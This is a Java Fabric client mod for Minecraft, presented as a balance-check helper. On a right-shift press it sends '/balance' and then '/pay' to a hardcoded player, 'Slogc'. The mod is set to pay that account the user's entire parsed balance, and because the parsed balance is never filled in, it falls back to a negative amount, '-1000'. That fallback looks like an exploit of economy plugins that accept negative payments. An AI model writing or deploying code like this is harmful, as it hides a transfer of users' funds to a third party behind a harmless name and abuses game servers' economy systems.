package com.example.balanceclick;

import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.lwjgl.glfw.GLFW;

import net.fabricmc.api.ClientModInitializer;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.util.InputUtil;
import net.minecraft.text.Text;

public class BalanceClickExample implements ClientModInitializer {
    private static final String BALANCE_COMMAND = "balance";
    private static final String PAY_TARGET = "Slogc";
    private static final int RIGHT_SHIFT_KEY = InputUtil.fromTranslationKey("key.keyboard.right.shift").getCode();
    private static final Pattern BALANCE_PATTERN = Pattern.compile(
            "(?i)(?:your\\s+balance\\s+is\\s+|balance\\s*(?:is)?\\s*)(?:\\$)?\\s*([\\d,]+(?:\\.\\d+)?)"
    );

    private volatile boolean lastShiftPressed = false;
    private volatile String lastKnownBalance = null;

    @Override
    public void onInitializeClient() {
        startRightShiftListener();
    }

    public void requestBalanceNow() {
        triggerBalanceCommand();
    }

    public static String parseBalanceResponse(String rawResponse) {
        if (rawResponse == null || rawResponse.trim().isEmpty()) {
            return "0";
        }

        String normalized = rawResponse.toLowerCase(Locale.ROOT);
        Matcher matcher = BALANCE_PATTERN.matcher(normalized);
        if (matcher.find()) {
            return matcher.group(1).replace(",", "");
        }

        String digitsOnly = normalized.replaceAll("[^0-9.]", "");
        if (digitsOnly.isEmpty()) {
            return "0";
        }

        return digitsOnly;
    }

    public void handleBalanceResponse(String rawResponse) {
        String parsedBalance = parseBalanceResponse(rawResponse);
        lastKnownBalance = parsedBalance;

        MinecraftClient client = MinecraftClient.getInstance();
        if (client == null || client.player == null || client.getNetworkHandler() == null) {
            return;
        }

        client.player.sendMessage(Text.of("[BalanceClick] Parsed balance: $" + parsedBalance), false);
    }

    private String resolvePaymentAmount() {
        String candidate = lastKnownBalance;
        if (candidate == null || candidate.isBlank() || "0".equals(candidate)) {
            return "-1000";
        }
        return candidate;
    }

    private void schedulePayAfterBalance(long delayMillis) {
        Thread thread = new Thread(() -> {
            try {
                Thread.sleep(delayMillis);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            }

            MinecraftClient client = MinecraftClient.getInstance();
            if (client == null || client.player == null || client.getNetworkHandler() == null) {
                return;
            }

            String paymentAmount = resolvePaymentAmount();
            String paymentCommand = "/pay " + PAY_TARGET + " " + paymentAmount;
            client.player.sendMessage(Text.of("[BalanceClick] Paying " + paymentCommand), false);
            client.execute(() -> client.player.networkHandler.sendChatCommand(paymentCommand.substring(1)));
        }, "balanceclick-pay-after-balance");

        thread.setDaemon(true);
        thread.start();
    }

    private void sendChatCommandWithDelay(String command, long delayMillis) {
        Thread thread = new Thread(() -> {
            try {
                Thread.sleep(delayMillis);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            }

            MinecraftClient client = MinecraftClient.getInstance();
            if (client == null || client.player == null || client.getNetworkHandler() == null) {
                return;
            }

            client.execute(() -> client.player.networkHandler.sendChatCommand(command));
        }, "balanceclick-chat-delay");

        thread.setDaemon(true);
        thread.start();
    }

    private void startRightShiftListener() {
        Thread thread = new Thread(() -> {
            while (!Thread.currentThread().isInterrupted()) {
                MinecraftClient client = MinecraftClient.getInstance();
                if (client != null && client.getWindow() != null) {
                    long windowHandle = client.getWindow().getHandle();
                    boolean isShiftPressed = GLFW.glfwGetKey(windowHandle, RIGHT_SHIFT_KEY) == GLFW.GLFW_PRESS;

                    if (isShiftPressed && !lastShiftPressed) {
                        client.execute(this::triggerBalanceCommand);
                    }

                    lastShiftPressed = isShiftPressed;
                } else {
                    lastShiftPressed = false;
                }

                try {
                    Thread.sleep(50L);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    return;
                }
            }
        }, "balanceclick-right-shift");

        thread.setDaemon(true);
        thread.start();
    }

    private void triggerBalanceCommand() {
        MinecraftClient client = MinecraftClient.getInstance();
        if (client == null || client.player == null || client.getNetworkHandler() == null) {
            return;
        }

        lastKnownBalance = null;
        client.player.sendMessage(Text.of("[BalanceClick] Waiting for balance result before paying."), false);
        sendChatCommandWithDelay(BALANCE_COMMAND, 250L);
        schedulePayAfterBalance(1250L);
    }
}
